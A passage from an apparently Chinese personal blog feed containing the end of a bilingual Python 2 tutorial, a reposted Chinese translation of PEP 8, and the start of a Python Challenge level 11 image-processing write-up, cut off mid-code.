class="string">"Joel"</span>)</span><br><span class="line"><span class="keyword">print</span> j.say(<span class="string">"hello"</span>)  <span class="comment"># prints out "Joel: hello"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Call our class method</span></span><br><span class="line"><span class="comment"># 调用类的方法</span></span><br><span class="line">i.get_species()   <span class="comment"># =&gt; "H. sapiens"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change the shared attribute</span></span><br><span class="line"><span class="comment"># 修改共享的参数</span></span><br><span class="line">Human.species = <span class="string">"H. neanderthalensis"</span></span><br><span class="line">i.get_species()   <span class="comment"># =&gt; "H. neanderthalensis"</span></span><br><span class="line">j.get_species()   <span class="comment"># =&gt; "H. neanderthalensis"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Call the static method</span></span><br><span class="line"><span class="comment"># 调用静态方法</span></span><br><span class="line">Human.grunt()   <span class="comment"># =&gt; "*grunt*"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Update the property</span></span><br><span class="line"><span class="comment"># 修改参数</span></span><br><span class="line">i.age = <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the property</span></span><br><span class="line"><span class="comment"># 获得参数值</span></span><br><span class="line">i.age <span class="comment"># =&gt; 42</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete the property</span></span><br><span class="line"><span class="comment"># 删除参数</span></span><br><span class="line"><span class="keyword">del</span> i.age</span><br><span class="line">i.age  <span class="comment"># =&gt; raises an AttributeError</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 6. Modules</span></span><br><span class="line"><span class="comment">## 6. 模块</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can import modules</span></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">print</span> math.sqrt(<span class="number">16</span>)  <span class="comment"># =&gt; 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can get specific functions from a module</span></span><br><span class="line"><span class="comment"># 从模块中导入指定函数</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil, floor</span><br><span class="line"><span class="keyword">print</span> ceil(<span class="number">3.7</span>)  <span class="comment"># =&gt; 4.0</span></span><br><span class="line"><span class="keyword">print</span> floor(<span class="number">3.7</span>)   <span class="comment"># =&gt; 3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can import all functions from a module.</span></span><br><span class="line"><span class="comment"># Warning: this is not recommended</span></span><br><span class="line"><span class="comment"># 可以从模块中导入所有函数，但不建议这么做。</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can shorten module names</span></span><br><span class="line"><span class="comment"># 缩短模块的名字</span></span><br><span class="line"><span class="keyword">import</span> math <span class="keyword">as</span> m</span><br><span class="line">math.sqrt(<span class="number">16</span>) == m.sqrt(<span class="number">16</span>)   <span class="comment"># =&gt; True</span></span><br><span class="line"><span class="comment"># you can also test that the functions are equivalent</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="comment"># 测试函数是否和调用的函数一样</span></span><br><span class="line">math.sqrt == m.sqrt == sqrt  <span class="comment"># =&gt; True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python modules are just ordinary python files. You</span></span><br><span class="line"><span class="comment"># can write your own, and import them. The name of the</span></span><br><span class="line"><span class="comment"># module is the same as the name of the file.</span></span><br><span class="line"><span class="comment"># Python 模块就是普通的 Python 文件。</span></span><br><span class="line"><span class="comment"># 你可以编写你自己的模块，然后导入它们。</span></span><br><span class="line"><span class="comment"># 模块的名称与文件名相同。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You can find out which functions and attributes</span></span><br><span class="line"><span class="comment"># defines a module.</span></span><br><span class="line"><span class="comment"># 查看模块中的所有函数和参数</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">dir(math)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment">## 7. Advanced</span></span><br><span class="line"><span class="comment">## 7. 进阶</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generators help you make lazy code</span></span><br><span class="line"><span class="comment"># 生成器让写代码更简单</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_numbers</span><span class="params">(iterable)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">yield</span> i + i</span><br><span class="line"></span><br><span class="line"><span class="comment"># A generator creates values on the fly.</span></span><br><span class="line"><span class="comment"># Instead of generating and returning all values at once it creates one in each</span></span><br><span class="line"><span class="comment"># iteration.  This means values bigger than 15 wont be processed in</span></span><br><span class="line"><span class="comment"># double_numbers.</span></span><br><span class="line"><span class="comment"># 生成器在运行的同时产生值，而不是一次性生成所有然后一个一个返回。大于15个两位数的值难以被执行。</span></span><br><span class="line"><span class="comment"># Note xrange is a generator that does the same thing range does.</span></span><br><span class="line"><span class="comment"># Creating a list 1-900000000 would take lot of time and space to be made.</span></span><br><span class="line"><span class="comment"># xrange creates an xrange generator object instead of creating the entire list</span></span><br><span class="line"><span class="comment"># like range does.</span></span><br><span class="line"><span class="comment"># xrange 就是这样一种生成器，他的效果和 range 一样，但是生成 1-900000000 会花费很多时间，xrange 会实时生成而非 range 那样全部生成。</span></span><br><span class="line"><span class="comment"># We use a trailing underscore in variable names when we want to use a name that</span></span><br><span class="line"><span class="comment"># would normally collide with a python keyword</span></span><br><span class="line"><span class="comment"># 如果想简单表明这个变量只是后面的关键字集合的话，我们只是在这个关键字后面加一个下划线来命名这个变量。</span></span><br><span class="line">xrange_ = xrange(<span class="number">1</span>, <span class="number">900000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># will double all numbers until a result &gt;=30 found</span></span><br><span class="line"><span class="comment"># 把所有数加倍，直到结果大于30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> double_numbers(xrange_):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">30</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decorators</span></span><br><span class="line"><span class="comment"># in this example beg wraps say</span></span><br><span class="line"><span class="comment"># Beg will call say. If say_please is True then it will change the returned</span></span><br><span class="line"><span class="comment"># message</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beg</span><span class="params">(target_function)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(target_function)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        msg, say_please = target_function(*args, **kwargs)</span><br><span class="line">        <span class="keyword">if</span> say_please:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;&#125; &#123;&#125;"</span>.format(msg, <span class="string">"Please! I am poor :("</span>)</span><br><span class="line">        <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@beg</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(say_please=False)</span>:</span></span><br><span class="line">    msg = <span class="string">"Can you buy me a beer?"</span></span><br><span class="line">    <span class="keyword">return</span> msg, say_please</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> say()  <span class="comment"># Can you buy me a beer?</span></span><br><span class="line"><span class="keyword">print</span> say(say_please=<span class="keyword">True</span>)  <span class="comment"># Can you buy me a beer? Please! I am poor :(</span></span><br></pre></td></tr></table></figure><h2 id="Ready-For-More"><a href="#Ready-For-More" class="headerlink" title="Ready For More?"></a>Ready For More?</h2><h3 id="Free-Online"><a href="#Free-Online" class="headerlink" title="Free Online"></a>Free Online</h3><ul><li><a href="https://automatetheboringstuff.com" target="_blank" rel="noopener">Automate the Boring Stuff with Python</a></li><li><a href="http://learnpythonthehardway.org/book/" target="_blank" rel="noopener">Learn Python The Hard Way</a></li><li><a href="http://www.diveintopython.net/" target="_blank" rel="noopener">Dive Into Python</a></li><li><a href="http://docs.python.org/2/" target="_blank" rel="noopener">The Official Docs</a></li><li><a href="http://docs.python-guide.org/en/latest/" target="_blank" rel="noopener">Hitchhiker’s Guide to Python</a></li><li><a href="http://pymotw.com/2/" target="_blank" rel="noopener">Python Module of the Week</a></li><li><a href="http://nbviewer.ipython.org/5920182" target="_blank" rel="noopener">A Crash Course in Python for Scientists</a></li><li><a href="https://realpython.com/learn/python-first-steps/" target="_blank" rel="noopener">First Steps With Python</a></li></ul><h3 id="Dead-Tree"><a href="#Dead-Tree" class="headerlink" title="Dead Tree"></a>Dead Tree</h3><ul><li><a href="http://www.amazon.com/gp/product/0596158106/ref=as_li_qf_sp_asin_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596158106&amp;linkCode=as2&amp;tag=homebits04-20" target="_blank" rel="noopener">Programming Python</a></li><li><a href="http://www.amazon.com/gp/product/1441413022/ref=as_li_tf_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1441413022&amp;linkCode=as2&amp;tag=homebits04-20" target="_blank" rel="noopener">Dive Into Python</a></li><li><a href="http://www.amazon.com/gp/product/0672329786/ref=as_li_tf_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0672329786&amp;linkCode=as2&amp;tag=homebits04-20" target="_blank" rel="noopener">Python Essential Reference</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「转」PEP8中文翻译</title>
      <link href="/2015/10-21-StyleGuideforPythonCode/"/>
      <url>/2015/10-21-StyleGuideforPythonCode/</url>
      
        <content type="html"><![CDATA[<p>自己翻译了一些发现了一个更好的版本<br>转过来<a href="http://wiki.hiaero.net/doku.php?id=python:pep8&amp;do=edit&amp;rev=0" target="_blank" rel="noopener">PEP8中文翻译</a><br>侵权删<br><a id="more"></a></p><hr><p>====== PEP8中文翻译 ======</p><p>本文仅代表个人认知、观点、经验，May be Stupid!</p><p>===== 什么是PEP =====</p><p>PEP是 //Python Enhancement Proposal// 的缩写，翻译过来就是 //Python增强建议书// 。</p><p>===== PEP8 =====</p><p>译者：本文基于 2013-08-02 最后修改的 PEP8 版本翻译，若要查看英文原文，请参考[[<a href="http://www.python.org/dev/peps/pep-0008/|PEP8]]" target="_blank" rel="noopener">http://www.python.org/dev/peps/pep-0008/|PEP8]]</a></p><p>==== 简介 ====</p><p>本文档给出的编码约定，来源于 Python 主发行版标准库中的代码。Python 的 C 语言实现所使用的 C 语言风格指南，请参考[[<a href="http://www.python.org/dev/peps/pep-0007/|PEP7]]。" target="_blank" rel="noopener">http://www.python.org/dev/peps/pep-0007/|PEP7]]。</a></p><p>本文档与 PEP 257（文档字符串规范）都来自于 Guido((Python 之父 Guido Van Rossum)) 的 //Python Style Guido// 论文原文，另外有来自 //[[<a href="http://barry.warsaw.us/software/STYLEGUIDE.txt|Barry&#39;s" target="_blank" rel="noopener">http://barry.warsaw.us/software/STYLEGUIDE.txt|Barry&#39;s</a> style guide]]// 的补充。</p><p>随着 Python 语言自身的改变，本指南也在持续演进，新的编码约定被认同，而旧的矣被废弃。</p><p>许多项目都有一套专有的编码风格指南，当冲突发生时，应以项目编码规范为优先。</p><p>==== 愚蠢的一致性就像没有脑子的妖怪 ====</p><p>Guido 的一个核心观点认为，相比于被编写，代码更多的是被阅读。这篇指南意在提高代码的可读性并使之在广袤的 Python 编码中保持风格一致。就像 PEP 20 所表述的，”可读性当被重视((Readability counts，参见[[<a href="http://www.python.org/dev/peps/pep-0020/|PEP" target="_blank" rel="noopener">http://www.python.org/dev/peps/pep-0020/|PEP</a> 20]]))”.</p><p>风格指南即一致性指南。本文档中描述的一致性是重要的，一个项目内代码的一致性则更重要一些，而一个模块或方法中代码的一致性则是最重要的。</p><p>但最终要的是：知道什么时候去打破一致性 — 风格指南并不总是适用。当存在不确定性时，做出你最好的抉择。你可以看看别人的代码是怎么写的，选择一种看起来最好的，并及时发问！</p><p>特别注意：不要为了遵守本 PEP 而破坏代码的向后兼容性!</p><p>当以下情况发生时，也是忽略某个风格指南的好理由：</p><ul><li>当遵守指南会降低代码可读性，甚至对于那些依循 PEP 去阅读代码的人也是这样时。</li><li>当遵守指南会与其他部分的代码风格背离时 — 当然也许这是一个修正某些混乱代码的机会。</li><li>当那些并没有遵循指南的旧代码已无法修改时。</li><li>当你的代码需要与旧版本的 Python 保持兼容，而旧版本的 Python 不支持指南中提到的特性时。</li></ul><p>==== 代码布局 ====</p><p>=== 缩进 ===</p><p>每次缩进使用 4 个空格。</p><p>续行((译者注：将一个逻辑行分为多个物理行时除第一行之外的行))应该与被圆括号、方括号、花括号包裹起来的其他元素对齐，或者使用悬挂式缩进。当使用悬挂式缩进时，应该遵循这些注意事项：第一行不能有参数，应该使用进一步的缩进来将续行与其他行区分开。</p><p>符合本约定的代码：<br><code python=""></code></p><h1 id="Aligned-with-opening-delimiter"><a href="#Aligned-with-opening-delimiter" class="headerlink" title="Aligned with opening delimiter"></a>Aligned with opening delimiter</h1><p>foo = long_function_name(var_one, var_two,<br>                         var_three, var_four)</p><h1 id="More-indentation-included-to-distinguish-this-from-the-rest"><a href="#More-indentation-included-to-distinguish-this-from-the-rest" class="headerlink" title="More indentation included to distinguish this from the rest."></a>More indentation included to distinguish this from the rest.</h1><p>def long_function_name(<br>        var_one, var_two, var_three,<br>        var_four):<br>    print(var_one)<br></p><p>不符合本约定的代码：<br><code python=""></code></p><h1 id="Arguments-on-first-line-forbidden-when-not-using-vertical-alignment"><a href="#Arguments-on-first-line-forbidden-when-not-using-vertical-alignment" class="headerlink" title="Arguments on first line forbidden when not using vertical alignment"></a>Arguments on first line forbidden when not using vertical alignment</h1><p>foo = long_function_name(var_one, var_two,<br>    var_three, var_four)</p><h1 id="Further-indentation-required-as-indentation-is-not-distinguishable"><a href="#Further-indentation-required-as-indentation-is-not-distinguishable" class="headerlink" title="Further indentation required as indentation is not distinguishable"></a>Further indentation required as indentation is not distinguishable</h1><p>def long_function_name(<br>    var_one, var_two, var_three,<br>    var_four):<br>    print(var_one)<br></p><p>可选的符合约定的代码：<br><code python=""></code></p><h1 id="Extra-indentation-is-not-necessary"><a href="#Extra-indentation-is-not-necessary" class="headerlink" title="Extra indentation is not necessary."></a>Extra indentation is not necessary.</h1><p>foo = long_function_name(<br>  var_one, var_two,<br>  var_three, var_four)<br></p><p>结尾的方括号/圆括号/花括号应该被放置在多行内容的最后一行的第一个非空字符的正下方((译者注：例如下例中’]’被放到’4’的正下方))，如下所示：</p><p><code python=""><br>my_list = [<br>    1, 2, 3,<br>    4, 5, 6,<br>    ]<br>result = some_function_that_takes_arguments(<br>    ‘a’, ‘b’, ‘c’,<br>    ‘d’, ‘e’, ‘f’,<br>    )<br></code></p><p>或者被放置在多行内容的起始行的第一个字符的正下方((译者注：例如下例中’)’被放到’r’的正下方))，如下所示：</p><p><code python=""><br>my_list = [<br>    1, 2, 3,<br>    4, 5, 6,<br>]<br>result = some_function_that_takes_arguments(<br>    ‘a’, ‘b’, ‘c’,<br>    ‘d’, ‘e’, ‘f’,<br>)<br></code></p><p>=== 制表符还是空格 ===</p><p>空格是首选的缩进方式。</p><p>为了保持一致性，在使用了制表符作为缩进的代码中，应该保持使用制表符。</p><p>Python 3 不支持空格缩进与制表符缩进混用。</p><p>Python 2 中的混用缩进代码也应该被转换为统一使用空格。</p><p>当使用 -t 选项来调用 Python 2 命令行工具时，运行混用缩进的代码会报出警告，当使用 -tt 选项时，运行混用缩进的代码会报出错误。强力建议使用这两个选项。</p><p>=== 单行最大长度 ===</p><p>将所有的行限制在79个字符以内。</p><p>对于那些具有很少的结构约束（例如文档字符串、注释）的代码段来说，最大行长度应该在在72个字符以内。</p><p>限制代码编辑窗口的宽度使并排编辑多个文件成为可能，并且在使用代码审核工具时，可以很好的在两个相邻列中显示不同的代码版本。</p><p>很多工具中的默认换行设置破坏了代码的可视结构，使其更难被理解。某些编辑器在换行时会在行尾放置标记字符，若限制代码的最大的长度，可以在这些最大宽度只有80个字符的编辑器中避免换行。而一些基于Web的工具也许根本不会提供动态自动换行功能。</p><p>一些团队更喜欢较长的单行代码。如果某个团队对单行代码长度的问题达成了共识，并且由该团队专门维护其代码的话，在将文档字符串与注释保持在72个字符以内的前提下，将名义上的单行代码的最大长度从80个字符提升到100个也是可以的（有效的将实际字符最大长度提高到了99个）。</p><p>Python 标准库是保守的，选择了将单行代码长度限制在79个字符以内（文档字符串/注释72个字符以内）。</p><p>最为推荐的长行换行方式是在圆括号、方括号、花括号内的 Python 隐式行续((译者注：即无需转义，在括号内直接换行))。相比于使用反斜杠来转义续行，应该优先使用将长行放置于圆括号内来隐式续行的方式。</p><p>而某些时候反斜杠也是适于使用的。例如，较长的with语句不能使用隐式行续，就需要使用反斜杠了:</p><p><code python=""><br>with open(‘/path/to/some/file/you/want/to/read’) as file_1, \<br>        open(‘/path/to/some/file/being/written’, ‘w’) as file_2:<br>    file_2.write(file_1.read())<br></code></p><p>另一个案例是，assert语句中也需要反斜杠。</p><p>确保使用适当的行续缩进。在二元操作符两端，换行的推荐位置是在操作符之后，而不是操作符之前。以下是一些例子：</p><p><code python=""><br>class Rectangle(Blob):</code></p><pre><code>def __init__(self, width, height,             color=&apos;black&apos;, emphasis=None, highlight=0):    if (width == 0 and height == 0 and            color == &apos;red&apos; and emphasis == &apos;strong&apos; or            highlight &gt; 100):        raise ValueError(&quot;sorry, you lose&quot;)    if width == 0 and height == 0 and (color == &apos;red&apos; or                                       emphasis is None):        raise ValueError(&quot;I don&apos;t think so -- values are %s, %s&quot; %                         (width, height))    Blob.__init__(self, width, height,                  color, emphasis, highlight)</code></pre><p></p><p>=== 空白行 ===</p><p>使用两个空白行来分隔顶级函数定义、类定义。</p><p>使用单个空白行来分隔类内的方法定义。</p><p>额外的空白行可以被（尽量少的）用来分隔几组相关的函数。在一堆相关的单行代码之间，空白行应该被省略。</p><p>在函数中（尽量少的）使用空白行来区分逻辑代码块。</p><p>Python 将 control-L (也就是, ^L) 换行符认作空白符。在许多工具中都将 control-L 识别做分页符，可以使用其来分页。但是注意，在某些编辑器或基于Web的代码浏览器中，control-L 是不会识别作换行符的，会被做为其他字符显示。</p><p>=== 源文件编码 ===</p><p>在 Python 的核心发布版中，应该主要使用 UTF-8 编码（或者在 Python 2 中使用 ASCII）。</p><p>在 Python 2 中使用 ASCII ，在 Python 3 中使用 UTF-8 时不应该在文件中进行编码声明。</p><p>在标准库中，往往只有以测试为目的的代码或包含非 ASCII 编码字符的作者名的注释中，才会使用非默认编码。否则，则推荐使用 \x, \u, \U, \N 等转义字符来在字符串文本中表示非 ASCII 字符。</p><p>在 Python 3.0 与更高级的 Python 版本中，对 Python 标准库的源文件编码作出了如下规定((参见 [[<a href="http://www.python.org/dev/peps/pep-3131/|PEP" target="_blank" rel="noopener">http://www.python.org/dev/peps/pep-3131/|PEP</a> 3131]]))：Python 标准库中的所有标示符必须仅使用 ACSII 编码的字符，在任何可能的时候都使用英文书写（在许多情况下，缩写名词和技术术语使用的是非英文）。另外，字符串文本与注释也必须使用 ASCII 编码。唯一的例外，是测试非 ASCII 编码特性的测试案例，与作者名的书写。对于非拉丁字符的作者名，应该将其翻译为拉丁字母书写。</p><p>推荐那些面向全球范围内开发者、用户的开源项目也遵循上述规定。</p><p>=== 导入 ===</p><p>  *import语句通常应该独立成行，例如：\ \ <code python=""></code></p><p>#符合约定的代码：<br>import os<br>import sys</p><p>#不符合本约定的代码：<br>import os,sys<br> 但这样的import也是的合理的：<code python=""><br>from subprocess import Popen, PIPE<br></code></p><p>  *Import 语句总应该被放到放到源码文件的最前端，即在模块注释与文档字符串之后，全局变量与常量定义之前。\ \ 多条 Import 语句总应该遵循这样的顺序书写：\ \ 1.  标准库的导入 \ 2.  相关第三方库导入 \ 3.  本地应用/库的相关导入 \ \ 在每组 import 语句应该使用空白行分隔。\ \ Put any relevant <nowiki><strong>all</strong></nowiki> specification after the imports.((译者注：这句没有翻出来))</p><p>  *建议使用绝对导入形式的 import 语句，它不仅更易读，并且在配置错误（例如某个包中的目录以 sys.path 结尾时)时有更良好的导入行为（至少有更好的报错）：\ \ <code python=""><br>import mypkg.sibling<br>from mypkg import sibling<br>from mypkg.sibling import example<br></code> 相比于绝对导入，清晰的相对导入其实也是可以接受的，特别是当使用绝对导入需要处理不必要的复杂包布局时。<code python=""><br>from . import sibling<br>from .sibling import example<br></code> Python 标准库代码应该避免复杂的包布局，并且总是使用绝对导入。\ Python 3 中不应该使用相对导入，并且 Python 3 中该功能已被移除。</p><p>  *当在某个包含类的模块中导入类时，这样的书写方式是合理的：\ \ <code python=""><br>from myclass import MyClass<br>from foo.bar.yourclass import YourClass<br></code> 但如果这样的书写方式引起类名冲突，则请这样书写：\ <code python=""><br>import myclass<br>import foo.bar.yourclass<br></code> 并使用 “myclass.MyClass” 和 “foo.bar.yourclass.YourClass” 来对其进行引用。</p><p>  <em>通配符导入（from <module> import </module></em>）应该被禁止，因为这样做会导致在被导入的命名空间中存在哪些命名对象变得不清晰，迷惑读者与其他自动化工具。不过要使用通配符导入，也有站得住脚的理由：需要将内部 API 重新发布为公共 API（例如，使用纯 Python 重写一个可选加速模块的借口，而事先你并不知道这个接口将被重写）。 \  \ 当以这样的方式重发布命名时，下述的编码指南依然适用。</p><p>==== 表达式与语句中的空白符 ====</p><p>=== 小问题 ===</p><p>在以下情况中避免使用额外的空格：</p><p>  *在圆括号、方括号、花括号内 \ \ <code python=""></code></p><p>#符合约定的代码<br>spam(ham[1], {eggs: 2})</p><p>#不符合约定的代码<br>spam( ham[ 1 ], { eggs: 2 } )<br></p><p>  *在逗号、分号、冒号之前： \ \ <code python=""></code></p><p>#符合约定的代码<br>if x == 4: print x, y; x, y = y, x</p><p>#不符合约定的代码<br>if x == 4 : print x , y ; x , y = y , x<br></p><p>  *在函数调用的参数列表的左括号前 \ \ <code python=""></code></p><p>#符合约定代码<br>spam(1)</p><p>#不符合约定的代码<br>spam (1)<br></p><p>  *在切片或索引的左方括号前 \ \ <code python=""></code></p><p>#符合约定的代码<br>dict[‘key’] = list[index]</p><p>#不符合约定的代码<br>dict [‘key’] = list [index]<br></p><p>  *在赋值（或其他）操作符两侧的多余一个的空格 \ \ <code python=""></code></p><p>#符合约定的代码<br>x = 1<br>y = 2<br>long_variable = 3</p><p>#不符合约定的代码<br>x             = 1<br>y             = 2<br>long_variable = 3<br></p><p>=== 其他建议 ===</p><p>  *总是在下列二元操作符的两端使用单个空格：赋值操作符<nowiki>(=)</nowiki>，参数赋值(+=, -= 等)，比较操作符(==, &lt;, &gt;, !=, &lt;&gt;, &lt;=, &gt;=, in, not in, is, is not)，布尔操作符(and, or, not)。</p><p>  *加入使用了多个具有不同优先级的操作符，考虑在低优先级的操作符两侧使用空格。请自行判断，无论怎样，不要使用多余一个空格，并且保持二元操作符两端的空格数量一致。\ \ <code python=""></code></p><p>#符合约定的代码<br>i = i + 1<br>submitted += 1<br>x = x<em>2 - 1<br>hypot2 = x</em>x + y<em>y<br>c = (a+b) </em> (a-b)</p><p>#不符合约定的代码<br>i=i+1<br>submitted +=1<br>x = x <em> 2 - 1<br>hypot2 = x </em> x + y <em> y<br>c = (a + b) </em> (a - b)<br></p><p>  *不要在指示关键字参数或参数默认值的 = 符号两端使用空格。 \ \ <code python=""></code></p><p>#符合约定的代码<br>def complex(real, imag=0.0):<br>    return magic(r=real, i=imag)</p><p>#不符合约定的代码<br>def complex(real, imag = 0.0):<br>    return magic(r = real, i = imag)<br></p><p>  *不建议使用符合语句（在一个物理行中存在多条语句）。 \ \ <code python=""></code></p><p>#符合建议的代码<br>if foo == ‘blah’:<br>    do_blah_thing()<br>do_one()<br>do_two()<br>do_three()</p><p>#不符合建议的代码<br>if foo == ‘blah’: do_blah_thing()<br>do_one(); do_two(); do_three()<br></p><p>  *虽然有时把较短小的 if/for/while 语句放在同一物理行内也是可以的，但千万不要对多子句的语句也这样做，同时也是为了避免折叠长行。 \ \ <code python=""></code></p><p>#不符合约定的代码<br>if foo == ‘blah’: do_blah_thing()<br>for x in lst: total += x<br>while t &lt; 10: t = delay()</p><p>#绝对不要这样写<br>if foo == ‘blah’: do_blah_thing()<br>else: do_non_blah_thing()</p><p>try: something()<br>finally: cleanup()</p><p>do_one(); do_two(); do_three(long, argument,<br>                             list, like, this)</p><p>if foo == ‘blah’: one(); two(); three()<br></p><p>==== 注释 ====</p><p>与代码相矛盾的注释不如没有，请时刻保持注释随代码更新。</p><p>注释应该是完整的句子。短语注释或整句注释都应当以大写字母开头，除非该注释以首字母小写的标示符开头。</p><p>段小注释后的句号可以省略，而在注释块中，每个完整的句子都应该以句号结尾。</p><p>在句尾句号之后，应该跟上两个空白符。</p><p>当撰写英文注释时，参考《英文写作指南((译者注：作者是小威廉·斯特伦克（William Strunk, Jr.）和E.B.怀特（Elwyn Brooks White），因此此书也被称 //Strunk &amp; White// ))》</p><p>非英语程序员也请使用英文书写注释，除非你120%的保证，不会有不使用你的语言的人阅读你的代码。</p><p>=== 块注释 ===</p><p>通常快注释用来阐述跟在其后的代码，并且与代码一样重要。块注释中的每一行都应该以一个 # 符号加一个空白符开头（除非是注释块内的缩进行）。</p><p>块注释内的自然段以 # 开头的空行分割。</p><p>=== 行内注释 ===</p><p>尽量少的使用行内注释。</p><p>行内注释应该与语句在同一行内，与语句之间以至少两个空白符分割，并且以一个 # 符号加一个空白符开头</p><p>行内注释不是非常必要，并且当注释语义显而易见时会分散阅读者的注意力。例如，不要撰写这样的注释：<br><code python=""><br>x = x + 1                 # Increment x<br></code></p><p>但某些时候，行内注释也是很有用的<br><code python=""><br>x = x + 1                 # Compensate for border<br></code></p><p>=== 文档字符串 ===</p><p>关于编写好文档字符串的约定，请参考 [[<a href="http://www.python.org/dev/peps/pep-0257/|PEP" target="_blank" rel="noopener">http://www.python.org/dev/peps/pep-0257/|PEP</a> 257]] 。</p><p>请为所有的公开模块、类和方法编写文档字符串。对于非公开的方法，文档字符串不是必须的，但是仍应该为其撰写注释，表明其用途。方法注释应写在方法定义行之下。</p><p>PEP 257 描述了良好文档字符串的编写规范。注意，以 “”” 结尾的文档字符串应该以该符号单独成行，最好前面还有一行空白行。 例如：<br><code python=""><br>“””Return a foobang</code></p><p>Optional plotz says to frobnicate the bizbaz first.</p><p>“””<br></p><p>对于单行的文档字符串来说，将 “”” 放在该行的末尾也是可以的。</p><p>==== 版本注记 ====</p><p>如果你的代码中需要有版本变更标记，请像这样书写。<br><code python=""><br><strong>version</strong> = “$Revision: 70b79ccd671a $”</code></p><h1 id="Source"><a href="#Source" class="headerlink" title="$Source$"></a>$Source$</h1><p></p><p>以上内容请</p><p>These lines should be included after the module’s docstring, before any other code, separated by a blank line above and below.</p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python Challenge 11-19</title>
      <link href="/2015/10-16-python-challenge-2/"/>
      <url>/2015/10-16-python-challenge-2/</url>
      
        <content type="html"><![CDATA[<p>我感觉我是做入迷了<br>因为确实好玩啊。。。<br>学到的知识比看书多多了<br>我这种就适合考前突击<br><a id="more"></a></p><hr><h1 id="第十一关-图片处理"><a href="#第十一关-图片处理" class="headerlink" title="第十一关 图片处理"></a><a href="http://www.pythonchallenge.com/pc/return/evil.html" target="_blank" rel="noopener">第十一关</a> 图片处理</h1><p>这一关还是考验图片处理的能力<br>但是对我来说却是考验安装第三方库、正确使用<code>Stack Overflow</code> 的能力<br>没有想到这一篇还要更新: <a href="http://gaoryrt.github.io/2015/10/16/install-python-package/" target="_blank" rel="noopener">安装 Python 库文件</a><br>开始的时候<code>.jpg</code>文件还不能解析，换成了<code>.png</code>，结果一样不能用。。。<br>重装了与<code>Image</code>相关的库，重新装了<br>然后就简单了<br>题目是奇数偶数，然后图片叫做<code>cave</code>，意思就是空了里面有东西<br>下载下来放大看是这样的:<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex3eauvv3oj20lr0ca7c1.jpg" alt=""><br>想了一会儿还以为有另外一个图片拿给我放一起拼起来。。。<br>放大看其实里面不全是黑色的，话说 mac 的数码测色计真是好用啊<br>就是把有颜色的都去掉:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">im = Image.open(<span class="string">'cave.jpg'</span>)</span><br><span class="line"></span><br><span class="line">print im.<span class="built_in">size</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">640</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span> in range(<span class="number">480</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">i</span>+<span class="built_in">j</span>)<span class="comment">%2==1:</span></span><br><span class="line">            im.putpixel((<span class="built_in">i</span>,<span class="built_in">j</span>),(<span class="number">0</span>,<span 